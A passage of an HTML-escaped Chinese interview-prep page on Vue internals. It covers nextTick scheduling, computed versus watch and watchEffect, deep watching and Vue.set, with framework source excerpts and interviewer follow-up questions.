true\\n\\n      if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; !config.async) {\\n        flushSchedulerQueue()\\n        return\\n      }\\n      // 把更新方法放到数组中维护[nextTick回调函数,更新函数flushSchedulerQueue]\\n      /**\\n       * vm.a = &#39;test&#39;; // 修改了数据后并不会马上更新视图\\n        vm.$nextTick(() =&gt; {// [fn,更新]\\n            console.log(vm.$el.innerHTML)\\n        })\\n       */\\n      nextTick(flushSchedulerQueue)\\n    }\\n  }\\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品列表刚追加一页数据，同步读取容器的 <code>offsetHeight</code> 仍是旧值，但页面稍后已经变高；为什么改了响应式数据却拿不到新高度？</strong></p>\\n<p>此时数据已经修改，但对应的 <code>DOM</code> 更新尚未完成。<code>Vue</code> 会把组件更新函数放入队列，在当前同步代码结束后异步批量刷新；应在修改数据后执行 <code>await nextTick()</code>，再读取高度，且它只保证 <code>Vue</code> 本轮更新完成，不保证图片等外部资源已加载。</p>\\n</li>\\n<li>\\n<p><strong>聊天窗口一次收到 30 条消息，每次 <code>push</code> 后都调用一次 <code>nextTick</code> 滚到底部，会不会创建 30 个独立异步刷新任务？</strong></p>\\n<p>不会为每次调用都单独启动刷新任务，多个回调会进入 <code>callbacks</code> 队列，并由 <code>pending</code> 标记保证本轮只安排一次异步清空。回调仍会依次执行，因此滚动逻辑重复 30 次依然浪费，应合并数据修改后只安排一次滚动。</p>\\n</li>\\n<li>\\n<p><strong>旧版浏览器里没有 <code>Promise</code>，订单弹窗依赖 <code>nextTick</code> 聚焦输入框；这个能力会直接失效吗？</strong></p>\\n<p>通常不会直接失效，<code>Vue</code> 2 会按环境尝试 <code>Promise</code>、<code>MutationObserver</code>、<code>setImmediate</code>，最后降级到 <code>setTimeout</code>。降级后回调仍是异步执行，但调度可能从微任务变成宏任务，因此只能依赖“更新后执行”，不能依赖精确的毫秒时序。</p>\\n</li>\\n<li>\\n<p><strong>同事在更新表格数据前注册 <code>Promise.resolve().then(readDOM)</code>，随后才赋值；线上偶尔读到旧行数，为什么不能把它当成 <code>nextTick</code>？</strong></p>\\n<p>自建微任务与 <code>Vue</code> 刷新任务的先后取决于注册顺序，先注册的 <code>Promise</code> 回调可能先于 <code>flushSchedulerQueue</code> 执行。<code>nextTick</code> 复用 <code>Vue</code> 的回调调度队列，数据变更触发的刷新函数会先入队，因此修改后再调用它更能保证读取更新后的 <code>DOM</code>。</p>\\n</li>\\n<li>\\n<p><strong>详情页在 <code>created</code> 中调用 <code>nextTick</code> 后查询 <code>.price-panel</code>，仍然得到 <code>null</code>；你会先排查什么？</strong></p>\\n<p>先确认节点是否确实会在本轮渲染中出现，例如是否受异步数据或条件渲染控制。<code>nextTick</code> 只等待已经排入队列的 <code>Vue</code> 更新，若请求尚未返回、条件仍为假，节点当然不存在；应在相关状态变更后再等待，而不是把它当成资源就绪事件。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_14-computed和watch相关\\"><a class=\\"header-anchor\\" href=\\"#_14-computed和watch相关\\">#</a> 14 computed和watch相关</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>computed</code> 是<strong>同步派生值 + 缓存</strong>：依赖不变就返回上次结果，模板里多次使用只算一次</li>\\n<li><code>watch</code> 是<strong>副作用监听</strong>：拿到新旧值做异步操作（发请求、写 <code>localStorage</code>、手动改 <code>DOM</code>）</li>\\n<li>选型：能由现有数据算出来的 → <code>computed</code>；数据变了要&quot;做点什么&quot; → <code>watch</code></li>\\n<li><code>computed</code> 里<strong>不要发请求</strong>：它靠依赖收集决定何时重算，返回的是 <code>Promise</code> 不是值，重算时机也不受控</li>\\n<li><code>deep: true</code> 要递归遍历整个对象建立依赖，能精确写路径就别开；<code>Vue 3</code> 推荐传 getter：<code>watch(() =&gt; a.b.c, cb)</code></li>\\n</ul>\\n<p><strong><code>computed</code> 适合生成有缓存的派生值，<code>watch</code> 适合在数据变化后执行副作用。</strong> <code>computed</code> 依赖不变时会直接返回缓存结果，因此姓名拼接、筛选列表这类模板数据更适合放进去。发请求、操作 <code>DOM</code> 或写入 <code>localStorage</code> 没有派生值可返回，我一般会用 <code>watch</code>。深度监听会遍历对象并建立依赖，开销更大，能明确到具体属性时可用 <code>watch(() =&gt; a.b.c, cb)</code>。</p>\\n</section>\\n<h3 id=\\"computed和watch区别\\"><a class=\\"header-anchor\\" href=\\"#computed和watch区别\\">#</a> computed和watch区别</h3>\\n<ol>\\n<li>当页面中有某些数据依赖其他数据进行变动的时候，可以使用计算属性<code>computed</code></li>\\n</ol>\\n<blockquote>\\n<p><code>Computed</code>本质是一个具备缓存的<code>watcher</code>，依赖的属性发生变化就会更新视图。 适用于计算比较消耗性能的计算场景。当表达式过于复杂时，在模板中放入过多逻辑会让模板难以维护，可以将复杂的逻辑放入计算属性中处理</p>\\n</blockquote>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/01/25.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-jsx\\"><code>&lt;template&gt;{{fullName}}&lt;/template&gt;\\nexport default {\\n    data(){\\n        return {\\n            firstName: &#39;zhang&#39;,\\n            lastName: &#39;san&#39;,\\n        }\\n    },\\n    computed:{\\n        fullName: function(){\\n            return this.firstName + &#39; &#39; + this.lastName\\n        }\\n    }\\n}\\n</code></pre>\\n<ol start=\\"2\\">\\n<li><code>watch</code>用于观察和监听页面上的vue实例，如果要在数据变化的同时进行异步操作或者是比较大的开销，那么<code>watch</code>为最佳选择</li>\\n</ol>\\n<blockquote>\\n<p><code>Watch</code>没有缓存性，更多的是观察的作用，可以监听某些数据执行回调。当我们需要深度监听对象中的属性时，可以打开<code>deep：true</code>选项，这样便会对对象中的每一项进行监听。这样会带来性能问题，优化的话可以使用字符串形式监听，如果没有写到组件中，不要忘记使用<code>unWatch</code>手动注销</p>\\n</blockquote>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/01/26.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-js\\"><code>&lt;template&gt;{{fullName}}&lt;/template&gt;\\nexport default {\\n    data(){\\n        return {\\n            firstName: &#39;zhang&#39;,\\n            lastName: &#39;san&#39;,\\n            fullName: &#39;zhang san&#39;\\n        }\\n    },\\n    watch:{\\n        firstName(val) {\\n            this.fullName = val + &#39; &#39; + this.lastName\\n        },\\n        lastName(val) {\\n            this.fullName = this.firstName + &#39; &#39; + val\\n        }\\n    }\\n}\\n</code></pre>\\n<p><strong>computed:</strong></p>\\n<ul>\\n<li><code>computed</code>是计算属性,也就是计算值,它更多用于计算值的场景</li>\\n<li><code>computed</code>具有缓存性,<code>computed</code>的值在<code>getter</code>执行后是会缓存的，只有在它依赖的属性值改变之后，下一次获取<code>computed</code>的值时才会重新调用对应的<code>getter</code>来计算</li>\\n<li><code>computed</code>适用于计算比较消耗性能的计算场景</li>\\n</ul>\\n<p><strong>watch:</strong></p>\\n<ul>\\n<li>更多的是「观察」的作用,类似于某些数据的监听回调,用于观察<code>props</code> <code>$emit</code>或者本组件的值,当数据变化时来执行回调进行后续操作</li>\\n<li>无缓存性，页面重新渲染时值不变化也会执行</li>\\n</ul>\\n<p><strong>小结:</strong></p>\\n<ul>\\n<li><code>computed</code>和<code>watch</code>都是基于<code>watcher</code>来实现的</li>\\n<li><code>computed</code>属性是具备缓存的，依赖的值不发生变化，对其取值时计算属性方法不会重新执行</li>\\n<li><code>watch</code>是监控值的变化，当值发生变化时调用其对应的回调函数</li>\\n<li>当我们要进行数值计算,而且依赖于其他数据，那么把这个数据设计为<code>computed</code></li>\\n<li>如果你需要在某个数据变化时做一些事情，使用<code>watch</code>来观察这个数据变化</li>\\n</ul>\\n<div class=\\"tip\\">\\n<p><strong>思路分析</strong></p>\\n<ul>\\n<li>先看<code>computed</code>, <code>watch</code>两者定义，列举使用上的差异</li>\\n<li>列举使用场景上的差异，如何选择</li>\\n<li>使用细节、注意事项</li>\\n<li><code>vue3</code>变化</li>\\n</ul>\\n<p><code>computed</code>特点：具有响应式的返回值</p>\\n<pre class=\\"language-js\\"><code>const count = ref(1)\\nconst plusOne = computed(() =&gt; count.value + 1)\\n</code></pre>\\n<p><code>watch</code>特点：侦测变化，执行回调</p>\\n<pre class=\\"language-js\\"><code>const state = reactive({ count: 0 })\\nwatch(\\n  () =&gt; state.count,\\n  (count, prevCount) =&gt; {\\n    /* ... */\\n  }\\n)\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>计算属性可以从组件数据派生出新数据，最常见的使用方式是设置一个函数，返回计算之后的结果，<code>computed</code>和<code>methods</code>的差异是它具备缓存性，如果依赖项不变时不会重新计算。侦听器可以侦测某个响应式数据的变化并执行副作用，常见用法是传递一个函数，执行副作用，watch没有返回值，但可以执行异步操作等复杂逻辑</li>\\n<li>计算属性常用场景是简化行内模板中的复杂表达式，模板中出现太多逻辑会是模板变得臃肿不易维护。侦听器常用场景是状态变化之后做一些额外的DOM操作或者异步操作。选择采用何用方案时首先看是否需要派生出新值，基本能用计算属性实现的方式首选计算属性.</li>\\n<li>使用过程中有一些细节，比如计算属性也是可以传递对象，成为既可读又可写的计算属性。<code>watch</code>可以传递对象，设置<code>deep</code>、<code>immediate</code>等选项</li>\\n<li><code>vue3</code>中<code>watch</code>选项发生了一些变化，例如不再能侦测一个点操作符之外的字符串形式的表达式； <code>reactivity API</code>中新出现了<code>watch</code>、<code>watchEffect</code>可以完全替代目前的<code>watch</code>选项，且功能更加强大</li>\\n</ol>\\n</div>\\n<p>基本使用</p>\\n<pre class=\\"language-js\\"><code>// src/core/observer:45;\\n\\n// 渲染watcher  /  computed watcher  /  watch\\nconst vm = new Vue({\\n    el: &#39;#app&#39;,\\n    data: {\\n        firstname:&#39;张&#39;,\\n        lastname:&#39;三&#39;\\n    },\\n    computed:{ // watcher  =&gt;   firstname lastname\\n        // computed 只有取值时才执行\\n\\n        // Object.defineProperty .get\\n        fullName(){ // firstName lastName 会收集fullName计算属性\\n            return this.firstname + this.lastname\\n        }\\n    },\\n    watch:{\\n        firstname(newVal,oldVal){\\n            console.log(newVal)\\n        }\\n    }\\n});\\n\\nsetTimeout(() =&gt; {\\n    debugger;\\n    vm.firstname = &#39;赵&#39;\\n}, 1000);\\n</code></pre>\\n<p>相关源码</p>\\n<pre class=\\"language-js\\"><code>// 初始化state\\nfunction initState (vm: Component) {\\n  vm._watchers = []\\n  const opts = vm.$options\\n  if (opts.props) initProps(vm, opts.props)\\n  if (opts.methods) initMethods(vm, opts.methods)\\n  if (opts.data) {\\n    initData(vm)\\n  } else {\\n    observe(vm._data = {}, true /* asRootData */)\\n  }\\n\\n  // 初始化计算属性\\n  if (opts.computed) initComputed(vm, opts.computed) \\n\\n  // 初始化watch\\n  if (opts.watch &amp;&amp; opts.watch !== nativeWatch) { \\n    initWatch(vm, opts.watch)\\n  }\\n}\\n\\n// 计算属性取值函数\\nfunction createComputedGetter (key) {\\n  return function computedGetter () {\\n    const watcher = this._computedWatchers &amp;&amp; this._computedWatchers[key]\\n    if (watcher) {\\n      if (watcher.dirty) { // 如果值依赖的值发生变化，就会进行重新求值\\n        watcher.evaluate(); // this.firstname lastname\\n      }\\n      if (Dep.target) { // 让计算属性所依赖的属性 收集渲染watcher\\n        watcher.depend()\\n      }\\n      return watcher.value\\n    }\\n  }\\n}\\n\\n// watch的实现\\nVue.prototype.$watch = function (\\n    expOrFn: string | Function,\\n    cb: any,\\n    options?: Object\\n  ): Function {\\n    const vm: Component = this\\n    debugger;\\n    if (isPlainObject(cb)) {\\n      return createWatcher(vm, expOrFn, cb, options)\\n    }\\n    options = options || {}\\n    options.user = true\\n    const watcher = new Watcher(vm, expOrFn, cb, options) // 创建watcher，数据更新调用cb\\n    if (options.immediate) {\\n      try {\\n        cb.call(vm, watcher.value)\\n      } catch (error) {\\n        handleError(error, vm, `callback for immediate watcher &quot;${watcher.expression}&quot;`)\\n      }\\n    }\\n    return function unwatchFn () {\\n      watcher.teardown()\\n    }\\n}\\n</code></pre>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/a263c317b0cb2793.png\\" alt=\\"\\"></p>\\n<h3 id=\\"vue3中-watch、watcheffect区别\\"><a class=\\"header-anchor\\" href=\\"#vue3中-watch、watcheffect区别\\">#</a> vue3中 watch、watchEffect区别</h3>\\n<ul>\\n<li><code>watch</code>是惰性执行，也就是只有监听的值发生变化的时候才会执行，但是<code>watchEffect</code>不同，每次代码加载<code>watchEffect</code>都会执行（忽略<code>watch</code>第三个参数的配置，如果修改配置项也可以实现立即执行）</li>\\n<li><code>watch</code>需要传递监听的对象，<code>watchEffect</code>不需要</li>\\n<li><code>watch</code>只能监听响应式数据：<code>ref</code>定义的属性和<code>reactive</code>定义的对象，如果直接监听<code>reactive</code>定义对象中的属性是不允许的（会报警告），除非使用函数转换一下。其实就是官网上说的监听一个<code>getter</code></li>\\n<li><code>watchEffect</code>如果监听<code>reactive</code>定义的对象是不起作用的，只能监听对象中的属性</li>\\n</ul>\\n<p>看一下<code>watchEffect</code>的代码</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n&lt;div&gt;\\n  请输入firstName：\\n  &lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;\\n&lt;/div&gt;\\n&lt;div&gt;\\n  请输入lastName：\\n  &lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt;\\n&lt;/div&gt;\\n&lt;div&gt;\\n  请输入obj.text：\\n  &lt;input type=&quot;text&quot; v-model=&quot;obj.text&quot;&gt;\\n&lt;/div&gt;\\n &lt;div&gt;\\n 【obj.text】 {{obj.text}}\\n &lt;/div&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport {ref, reactive, watch, watchEffect} from &#39;vue&#39;\\nexport default {\\n  name: &quot;HelloWorld&quot;,\\n  props: {\\n    msg: String,\\n  },\\n  setup(props,content){\\n    let firstName = ref(&#39;&#39;)\\n    let lastName = ref(&#39;&#39;)\\n    let obj= reactive({\\n      text:&#39;hello&#39;\\n    })\\n    watchEffect(()=&gt;{\\n      console.log(&#39;触发了watchEffect&#39;);\\n      console.log(`组合后的名称为：${firstName.value} ${lastName.value}`)\\n    })\\n    return{\\n      obj,\\n      firstName,\\n      lastName\\n    }\\n  }\\n};\\n&lt;/script&gt;\\n</code></pre>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/99d5a09b368aeaa7.png\\" alt=\\"\\">\\n<img src=\\"https://s.poetries.top/uploads/2022/08/c098258e10bbeccf.png\\" alt=\\"\\"></p>\\n<p>改造一下代码</p>\\n<pre class=\\"language-js\\"><code>watchEffect(()=&gt;{\\n  console.log(&#39;触发了watchEffect&#39;);\\n  // 这里我们不使用firstName.value/lastName.value ，相当于是监控整个ref,对应第四点上面的结论\\n  console.log(`组合后的名称为：${firstName} ${lastName}`)\\n})\\n</code></pre>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/41a0ee2dc000ecc3.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-js\\"><code>watchEffect(()=&gt;{\\n  console.log(&#39;触发了watchEffect&#39;);\\n  console.log(obj);\\n})\\n</code></pre>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/0277951e96a40117.png\\" alt=\\"\\"></p>\\n<p>稍微改造一下</p>\\n<pre class=\\"language-js\\"><code>let obj = reactive({\\n  text:&#39;hello&#39;\\n})\\nwatchEffect(()=&gt;{\\n  console.log(&#39;触发了watchEffect&#39;);\\n  console.log(obj.text);\\n})\\n</code></pre>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/f959357382b9935a.png\\" alt=\\"\\"></p>\\n<p><strong>再看一下watch的代码，验证一下</strong></p>\\n<pre class=\\"language-js\\"><code>let obj= reactive({\\n  text:&#39;hello&#39;\\n})\\n// watch是惰性执行， 默认初始化之后不会执行，只有值有变化才会触发，可通过配置参数实现默认执行\\nwatch(obj, (newValue, oldValue) =&gt; {\\n  // 回调函数\\n  console.log(&#39;触发监控更新了new&#39;,  newValue);\\n  console.log(&#39;触发监控更新了old&#39;,  oldValue);\\n},{\\n  // 配置immediate参数，立即执行，以及深层次监听\\n  immediate: true,\\n  deep: true\\n})\\n</code></pre>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/c5ec33f5f3b8b6a1.png\\" alt=\\"\\"></p>\\n<ul>\\n<li>监控整个<code>reactive</code>对象，从上面的图可以看到 <code>deep</code> 实际默认是开启的，就算我们设置为<code>false</code>也还是无效。而且旧值获取不到。</li>\\n<li>要获取旧值则需要监控对象的属性，也就是监听一个<code>getter</code>，看下图</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/f3bbb272dee1d73c.png\\" alt=\\"\\">\\n<img src=\\"https://s.poetries.top/uploads/2022/08/6a6bba3d39dbdc6f.png\\" alt=\\"\\"></p>\\n<p><strong>总结</strong></p>\\n<ul>\\n<li>如果定义了<code>reactive</code>的数据，想去使用<code>watch</code>监听数据改变，则无法正确获取旧值，并且<code>deep</code>属性配置无效，自动强制开启了深层次监听。</li>\\n<li>如果使用 <code>ref</code> 初始化一个对象或者数组类型的数据，会被自动转成<code>reactive</code>的实现方式，生成<code>proxy</code>代理对象。也会变得无法正确取旧值。</li>\\n<li>用任何方式生成的数据，如果接收的变量是一个<code>proxy</code>代理对象，就都会导致<code>watch</code>这个对象时,<code>watch</code>回调里无法正确获取旧值。</li>\\n<li>所以当大家使用<code>watch</code>监听对象时，如果在不需要使用旧值的情况，可以正常监听对象没关系；但是如果当监听改变函数里面需要用到旧值时，只能监听 对象.xxx`属性 的方式才行</li>\\n</ul>\\n<div class=\\"tip\\">\\n<p><strong>体验</strong></p>\\n<p><code>watchEffect</code>立即运行一个函数，然后被动地追踪它的依赖，当这些依赖改变时重新执行该函数</p>\\n<pre class=\\"language-js\\"><code>const count = ref(0)\\n​\\nwatchEffect(() =&gt; console.log(count.value))\\n// -&gt; logs 0\\n​\\ncount.value++\\n// -&gt; logs 1\\n</code></pre>\\n<p><code>watch</code>侦测一个或多个响应式数据源并在数据源变化时调用一个回调函数</p>\\n<pre class=\\"language-js\\"><code>const state = reactive({ count: 0 })\\nwatch(\\n  () =&gt; state.count,\\n  (count, prevCount) =&gt; {\\n    /* ... */\\n  }\\n)\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li><code>watchEffect</code>立即运行一个函数，然后被动地追踪它的依赖，当这些依赖改变时重新执行该函数。<code>watch</code>侦测一个或多个响应式数据源并在数据源变化时调用一个回调函数</li>\\n<li><code>watchEffect(effect)</code>是一种特殊<code>watch</code>，传入的函数既是依赖收集的数据源，也是回调函数。如果我们不关心响应式数据变化前后的值，只是想拿这些数据做些事情，那么<code>watchEffect</code>就是我们需要的。<code>watch</code>更底层，可以接收多种数据源，包括用于依赖收集的<code>getter</code>函数，因此它完全可以实现<code>watchEffect</code>的功能，同时由于可以指定<code>getter</code>函数，依赖可以控制的更精确，还能获取数据变化前后的值，因此如果需要这些时我们会使用<code>watch</code></li>\\n<li><code>watchEffect</code>在使用时，传入的函数会立刻执行一次。<code>watch</code>默认情况下并不会执行回调函数，除非我们手动设置<code>immediate</code>选项</li>\\n<li>从实现上来说，<code>watchEffect(fn)</code>相当于<code>watch(fn,fn,{immediate:true})</code></li>\\n</ol>\\n<p><code>watchEffect</code>定义如下</p>\\n<pre class=\\"language-js\\"><code>export function watchEffect(\\n  effect: WatchEffect,\\n  options?: WatchOptionsBase\\n): WatchStopHandle {\\n  return doWatch(effect, null, options)\\n}\\n</code></pre>\\n<p><code>watch</code>定义如下</p>\\n<pre class=\\"language-js\\"><code>export function watch&lt;T = any, Immediate extends Readonly&lt;boolean&gt; = false&gt;(\\n  source: T | WatchSource&lt;T&gt;,\\n  cb: any,\\n  options?: WatchOptions&lt;Immediate&gt;\\n): WatchStopHandle {\\n  return doWatch(source as any, cb, options)\\n}\\n</code></pre>\\n<p>很明显<code>watchEffect</code>就是一种特殊的<code>watch</code>实现。</p>\\n</div>\\n<h3 id=\\"watch中的deep-true是如何实现的\\"><a class=\\"header-anchor\\" href=\\"#watch中的deep-true是如何实现的\\">#</a> Watch中的deep:true是如何实现的</h3>\\n<blockquote>\\n<p>当用户指定了 <code>watch</code> 中的deep属性为 <code>true</code> 时，如果当前监控的值是数组类型。会对对象中的每一项进行求值，此时会将当前 <code>watcher</code>存入到对应属性的依赖中，这样数组中对象发生变化时也会通知数据更新</p>\\n</blockquote>\\n<p><strong>源码相关</strong></p>\\n<pre class=\\"language-js\\"><code>get () { \\n    pushTarget(this) // 先将当前依赖放到 Dep.target上 \\n    let value \\n    const vm = this.vm \\n    try { \\n        value = this.getter.call(vm, vm) \\n    } catch (e) { \\n        if (this.user) { \\n            handleError(e, vm, `getter for watcher &quot;${this.expression}&quot;`) \\n        } else { \\n            throw e \\n        } \\n    } finally { \\n        if (this.deep) { // 如果需要深度监控 \\n        traverse(value) // 会对对象中的每一项取值,取值时会执行对应的get方法 \\n    }\\n    popTarget() \\n}\\n</code></pre>\\n<h3 id=\\"vue-computed-实现\\"><a class=\\"header-anchor\\" href=\\"#vue-computed-实现\\">#</a> Vue computed 实现</h3>\\n<ul>\\n<li>建立与其他属性（如：<code>data</code>、 <code>Store</code>）的联系；</li>\\n<li>属性改变后，通知计算属性重新计算</li>\\n</ul>\\n<blockquote>\\n<p>实现时，主要如下</p>\\n</blockquote>\\n<ul>\\n<li>初始化 <code>data</code>， 使用 <code>Object.defineProperty</code> 把这些属性全部转为 <code>getter/setter</code>。</li>\\n<li>初始化 <code>computed</code>, 遍历 <code>computed</code> 里的每个属性，每个 <code>computed</code> 属性都是一个 <code>watch</code> 实例。每个属性提供的函数作为属性的 <code>getter</code>，使用 <code>Object.defineProperty</code> 转化。</li>\\n<li><code>Object.defineProperty getter</code> 依赖收集。用于依赖发生变化时，触发属性重新计算。</li>\\n<li>若出现当前 <code>computed</code> 计算属性嵌套其他 <code>computed</code> 计算属性时，先进行其他的依赖收集</li>\\n</ul>\\n<h3 id=\\"watch-原理\\"><a class=\\"header-anchor\\" href=\\"#watch-原理\\">#</a> watch 原理</h3>\\n<p><code>watch</code> 本质上是为每个监听属性 <code>setter</code> 创建了一个 <code>watcher</code>，当被监听的属性更新时，调用传入的回调函数。常见的配置选项有 <code>deep</code> 和 <code>immediate</code>，对应原理如下</p>\\n<ul>\\n<li><code>deep</code>：深度监听对象，为对象的每一个属性创建一个 <code>watcher</code>，从而确保对象的每一个属性更新时都会触发传入的回调函数。主要原因在于对象属于引用类型，单个属性的更新并不会触发对象 <code>setter</code>，因此引入 <code>deep</code> 能够很好地解决监听对象的问题。同时也会引入判断机制，确保在多个属性更新时回调函数仅触发一次，避免性能浪费。</li>\\n<li><code>immediate</code>：在初始化时直接调用回调函数，可以通过在 <code>created</code> 阶段手动调用回调函数实现相同的效果</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>结算页监听整个 <code>order</code> 对象，但代码只执行 <code>order.address.city = \'上海\'</code>，普通 <code>watch</code> 没有触发；为什么对象明明变了却没有回调？</strong></p>\\n<p>普通监听主要依赖被监听属性自身的 <code>setter</code>，修改深层字段并没有替换 <code>order</code> 引用，因此对象这一层不会触发对应回调。需要监听具体字段，或在确实要覆盖所有嵌套变化时启用 <code>deep</code>；后者会扩大依赖范围并增加遍历成本。</p>\\n</li>\\n<li>\\n<p><strong>后台表单初始化后必须立即拉取一次报价，之后 <code>form.plan</code> 变化还要重新拉取；你会用 <code>created</code> 手动调一次还是配置 <code>watch</code>？</strong></p>\\n<p>可以给该监听配置 <code>immediate</code>，让回调在初始化时先执行一次，后续仍由属性更新触发，避免入口逻辑分散。若首次调用和变更调用的前置条件不同，手动调用会更清晰；无论哪种方式，都要避免初始化数据尚未齐全时误发请求。</p>\\n</li>\\n<li>\\n<p><strong>配置中心有一个数百字段的嵌套对象，同事为了保存草稿直接设置 <code>deep: true</code>；你会接受这个方案吗？</strong></p>\\n<p>只有确实需要捕获任意深层字段变化时才接受，因为深度监听需要递归访问嵌套属性以建立依赖，数据越大代价越明显。更稳妥的是监听明确路径或拆分数据区域；若需求就是任意字段自动保存，则还应合并频繁变更，避免回调反复执行。</p>\\n</li>\\n<li>\\n<p><strong>用户连续修改姓名和手机号后，深度监听的保存回调只执行了一轮，同事认为漏掉了一次更新；你如何判断？</strong></p>\\n<p>这不一定是漏监听，多个属性在同一更新周期内变化时，相关 <code>watcher</code> 会进入更新队列并进行合并，回调可能只触发一次。应检查最终回调读取到的数据是否同时包含两处新值；若业务要求记录每一次中间状态，就不能只依赖批量调度后的 <code>watch</code>。</p>\\n</li>\\n<li>\\n<p><strong>线上筛选器改值后没有发请求，你看到配置写成监听 <code>filters</code>，实际变更是 <code>filters.range.start</code>；排查顺序是什么？</strong></p>\\n<p>先确认是否替换了 <code>filters</code> 引用，还是只触发了深层属性的 <code>setter</code>，再检查是否配置 <code>deep</code> 或监听了精确路径。随后验证该字段在初始化时是否已具备响应式能力；仅给普通对象监听顶层引用，无法覆盖所有内部修改。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_15-vue-set的实现原理\\"><a class=\\"header-anchor\\" href=\\"#_15-vue-set的实现原理\\">#</a> 15 Vue.set的实现原理</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>解决 <code>Vue 2</code> 无法拦截&quot;新增属性&quot;和&quot;数组下标赋值&quot;的问题</li>\\n<li>数组分支：直接调<strong>被重写过的</strong> <code>splice(index, 1, value)</code>，借它完成响应式处理和通知</li>\\n<li>对象分支：如果 key 已存在直接赋值即可；不存在则用 <code>defineReactive</code> 给它补上 <code>getter</code>/<code>setter</code>，再手动 <code>ob.dep.notify()</code></li>\\n<li>⚠️ 不能给 <code>Vue</code> 实例本身或根级 <code>data</code> 添加属性 —— 源码里会直接警告</li>\\n<li><code>Vue 3</code> 用 <code>Proxy</code> 后新增属性天然可拦截，<code>Vue.set</code> 已被移除</li>\\n</ul>\\n<p><strong><code>Vue.set</code> 本质上是在 <code>Vue 2</code> 中补齐新增对象属性和数组下标赋值的响应式能力。</strong> 对数组设置索引时，它会调用被重写的 <code>splice</code>，借此完成响应式处理并通知视图更新。对对象新增属性时，它通过 <code>defineReactive</code> 补上 <code>getter</code> 和 <code>setter</code>，再调用 <code>ob.dep.notify()</code>；已有属性则直接赋值。它不能给 <code>Vue</code> 实例或根级 <code>data</code> 动态加属性，而 <code>Vue 3</code> 使用 <code>Proxy</code> 后已经不再需要这个 <code>API</code>。</p>\\n</section>\\n<blockquote>\\n<p><strong>版本说明</strong>：<code>Vue.set</code> / <code>this.$set</code> 是 <strong>Vue 2</strong> 为绕开 <code>Object.defineProperty</code> 无法检测「对象属性新增」和「数组下标赋值」而提供的 API。<strong>Vue 3 用 <code>Proxy</code> 后，直接 <code>obj.newKey = x</code>、<code>arr[i] = x</code>、<code>arr.length = n</code> 都是响应式的，<code>Vue.set</code> 已被移除、不再需要</strong>。本节作为「Vue 2 为什么需要它、它怎么实现」的历史对照。</p>\\n</blockquote>\\n<ul>\\n<li>给对象和数组本身都增加了<code>dep</code>属性</li>\\n<li>当给对象新增不存在的属性则触发对象依赖的<code>watcher</code>去更新</li>\\n<li>当修改数组索引时，我们调用数组本身的<code>splice</code>去更新数组（数组的响应式原理就是重新了<code>splice</code>等方法，调用<code>splice</code>就会触发视图更新）</li>\\n</ul>\\n<p><strong>基本使用</strong></p>\\n<blockquote>\\n<p>以下方法调用会改变原始数组：<code>push()</code>, <code>pop()</code>, <code>shift()</code>, <code>unshift()</code>, <code>splice()</code>, <code>sort()</code>, <code>reverse()</code>,<code>Vue.set( target, key, value )</code></p>\\n</blockquote>\\n<ul>\\n<li>调用方法：<code>Vue.set(target, key, value )</code>\\n<ul>\\n<li><code>target</code>：要更改的数据源(可以是对象或者数组)</li>\\n<li><code>key</code>：要更改的具体数据</li>\\n<li><code>value</code> ：重新赋的值</li>\\n</ul>\\n</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;div id=&quot;app&quot;&gt;{{user.name}} {{user.age}}&lt;/div&gt;\\n&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;\\n&lt;script&gt;\\n    // 1. 依赖收集的特点：给每个属性都增加一个dep属性，dep属性会进行收集，收集的是watcher\\n    // 2. vue会给每个对象也增加一个dep属性\\n    const vm = new Vue({\\n        el: &#39;#app&#39;,\\n        data: { // vm._data  \\n            user: {name:&#39;poetry&#39;}\\n        }\\n    });\\n    // 对象的话：调用defineReactive在user对象上定义一个age属性，增加到响应式数据中，触发对象本身的watcher，ob.dep.notify()更新 \\n    // 如果是数组 通过调用 splice方法，触发视图更新\\n    vm.$set(vm.user, &#39;age&#39;, 20); // 不能给根属性添加，因为给根添加属性 性能消耗太大，需要做很多处理\\n\\n    // 修改肯定是同步的 -&gt; 更新都是一步的  queuewatcher\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>相关源码</strong></p>\\n<pre class=\\"language-js\\"><code>// src/core/observer/index.js 44\\nexport class Observer { // new Observer(value)\\n  value: any;\\n  dep: Dep;\\n  vmCount: number; // number of vms that have this object as root $data\\n\\n  constructor (value: any) {\\n    this.value = value\\n    this.dep = new Dep() // 给所有对象类型增加dep属性\\n  }\\n}\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// src/core/observer/index.js 201\\nexport function set (target: Array&lt;any&gt; | Object, key: any, val: any): any {\\n  // 